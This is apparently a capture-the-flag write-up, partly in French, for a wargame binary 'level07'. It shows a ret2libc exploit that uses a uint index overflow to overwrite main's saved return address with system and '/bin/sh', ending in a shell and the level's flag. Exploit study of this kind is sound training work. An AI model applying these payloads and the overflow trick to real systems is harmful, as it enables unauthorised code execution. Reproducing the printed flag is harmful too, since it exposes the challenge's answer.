addr of "/bin/sh" : 0xf7f897ec
addr of system: 0xf7e6aed0
addr of exit: 0xf7e6aed0

Ret2libc code:

```
python -c 'print "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "
```

We need to be able to put this code in a place where it can be executed later on.
Command[20] could allow us to store this ret2libc as the commands are quite short and no check is performed on these adresses

To do so we can first call for a garbage command to prefix our shellcode

```
python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n"'
```

This should allow us to be able to then call "store" command and pass an index without touching to the ret2libc code contained in command[20]

The data we want to store using "store" needs to be put at an index that will be executed.
To do so we can override the address of the plt of a function
-> stack_check_fail : 0x804a010
-> printf : 0x804a000
-> fgets : 0x804a00c

```
(python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + "<addr of buffer command>"[::-1] + "\n" + "diff between addr of data_storage and printf plt"' ; cat) | ./level07
(python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + "4294956639" + "\n" + "4160435336"' ; cat) | ./level07
```

We were wrong on the approach as what refers to the plt seems to be inaccessible from our program's dedicated memory. What we need to do instead is to override the EIP execution pointer to make it point towards our exploit. Let's keep going with our method of Ret2libc but in a slightly different way:

system: "0xf7e6aed0" => 4159090384
"/bin/sh": "0xf7f897ec" => 4160264172
addr of buffer: "0xffffd544" =>
addr of eip after store_number: "0xffffd51c" => contient une adresse de main
addr of eip after read_number: "0xffffd51c" => contient une adresse de main
addr of eip at the start of main function: "0xffffd70c" => contient l'adresse de retour apres le main

When exiting a function, the address stored in EIP carries the address of the next executed command.
Depuis le buffer 0xffffd544 on peut aller override ce saved pointer de EIP. Ainsi, quand la fonction main exit, elle sera redirigee vers notre exploit.
0xffffd70c - 0xffffd544 = 456
Etant un tableau d'uint, chaque index avance de 4 octets. Ainsi pour atteindre l'adresse 0xffffd70C on doit ecrire a l'index 456/4 = 114.
114 etant un multiple de 3, on va devoir trouver une astuce (overflow uint)

On doit trouver une valeur suffisament grande pour overflow lorsque multipliee par 4.
uint est compris entre 0 et 2^32 -1
mutliplier par deux revient a bitshift a gauche de 1
2^30 << 2 = 2^32 = 0 (premiere valeur qui overflow)
2^30 = 1073741824
2^30 + 114 = 1073741938
1073741938 \* 4 = 4294967752
4294967752 % 2^32 = 456 Done

-> stocker l'adresse de system a l'adresse 0xffffd70c et l'adresse de "/bin/sh" (index 114) a l'adresse 0xffffd70e (index 116)

Il ne reste plus qu'a quitter la fonction main

```
Input command: store
 Number: 4159090384
 Index: 1073741938 (114 overflown)
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
```

flag

```
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
